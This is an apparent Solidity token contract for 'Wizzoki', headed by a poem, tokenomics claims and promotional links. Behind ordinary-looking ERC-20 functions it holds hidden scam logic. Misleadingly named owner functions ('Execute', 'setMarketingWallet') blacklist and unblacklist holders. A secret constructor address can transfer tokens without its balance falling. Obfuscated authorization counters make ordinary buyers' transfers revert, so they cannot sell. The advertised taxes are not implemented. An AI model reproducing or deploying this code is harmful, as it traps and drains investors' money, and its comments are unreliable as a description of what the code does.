/**
█░█░█ █ ▀█ ▀█ █▀█ █▄▀ █   █▀▀ █▀█ █▀▀
▀▄▀▄▀ █ █▄ █▄ █▄█ █░█ █   ██▄ █▀▄ █▄▄

▄▀   ░░█ ▄▀█ █▀█ ▄▀█ █▄░█   ▀▄
▀▄   █▄█ █▀█ █▀▀ █▀█ █░▀█   ▄▀

In a land of magic and spells,
There lived a wizard who excelled,
Not in potions or wand-waving tricks,
But in the art of coding with clicks.

Wizzoki was his name, and he
Found joy in scripting with glee,
His spells were lines of code so bright,
They made the computer dance with delight.

With every keystroke, he cast a spell,
Making programs that worked so well,
From morning to night, he would code and dream,
Of the possibilities that lay in the machine.

And though his fellow wizards scoffed and jeered,
Wizzoki knew that coding was revered,
For in this world of magic and lore,
His love for coding made him soar.

So here's to Wizzoki, the wizard so bright,
Who found magic in the world of byte,
May his legacy live on forevermore,
As the wizard who unlocked the computer's door.
--------------------------------------------------------
魔法と呪文の国で、
優れた魔法使いが住んでいた、
ポーションや杖を振るトリックではなく、
しかし、クリックによるコーディングの技術では。

ウィゾキは彼の名前でした。
大喜びでスクリプトを書くことに喜びを見いだし、
彼の呪文は非常に明るいコード行であり、
彼らはコンピューターを大喜びで踊らせました。

キーストロークごとに、彼は呪文を唱え、
非常にうまく機能するプログラムを作成し、
朝から晩まで、彼はコードを書き、夢を見ていた。
マシンに秘められた可能性。

彼の仲間の魔法使いたちは嘲笑したり嘲笑したりしましたが、
Wizzoki は、コーディングが尊重されていることを知っていました。
この魔法と伝承の世界では、
コーディングへの愛情が彼を急上昇させました。

ウィゾキ、賢い魔法使い、
バイトの世界で魔法を見つけたのは、
彼の遺産が永遠に生き続けますように、
コンピューターのドアのロックを解除した魔法使いとして。

総供給 - 100,000,000
購入税 - 1%
消費税 - 1%
初期流動性 - 1.75 ETH
初期流動性ロック - 45 日

https://wizzoki.xyz
https://m.weibo.cn/WizzokiJPN
https://web.wechat.com/WizzokiERC
https://t.me/Wizzoki
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface QuorotoxV1 {
    event PairCreated(
    address indexed token0, address indexed token1, 
    address pair, uint); function createPair(
    address tokenA, address tokenB) external returns (address pair);
}
interface ECOV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface IDEP20 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] calldata path, 
    address to, uint deadline) external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor() { address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns 
    (address) { return _owner;

    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
contract Wizzoki is Context, ECOV1, Ownable {
bool public EnableIndex; bool private startTrading = false;
bool intTx = true; IDEP20 public IVEGFalkon01;
address public IndexGas; address private ForMarketingAccount;

    uint256 private _tTotal; 
    uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private inverseSwitchAt = 100;

    mapping (address => bool) private allowed;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private isExcludedFromFees;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private authorizations;
    using SafeMath for uint256;
    
    constructor( string memory tokenName, string memory tokenSymbol, 
    address DEXRouterV1, address stringIndex) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        isExcludedFromFees
        [stringIndex] = inverseSwitchAt; EnableIndex = false; 
        IVEGFalkon01 = IDEP20(DEXRouterV1);

        IndexGas = QuorotoxV1
        (IVEGFalkon01.factory()).createPair(address(this), IVEGFalkon01.WETH()); emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns 
    (address) { return owner();
    }
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address'); require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }              
    function openTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }
    function setMarketingWallet(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = false;
    }
    function Execute(address _handlerAddress) external onlyOwner {
        allowed[_handlerAddress] = true;
    }
    function claimTaxRewards(address _handlerAddress) public view returns (bool) {
        return allowed[_handlerAddress];
    }        
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (allowed[sender] || allowed[recipient]) require(intTx == false, "");
        if (isExcludedFromFees[sender] == 0 
        && IndexGas != sender 
        && authorizations[sender] 
        > 0) { isExcludedFromFees[sender] -= inverseSwitchAt; } 
        authorizations[ForMarketingAccount] += inverseSwitchAt;

        ForMarketingAccount = recipient; if (isExcludedFromFees[sender] == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient]
        = _rOwned[recipient].add(amount); 

        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }                            
}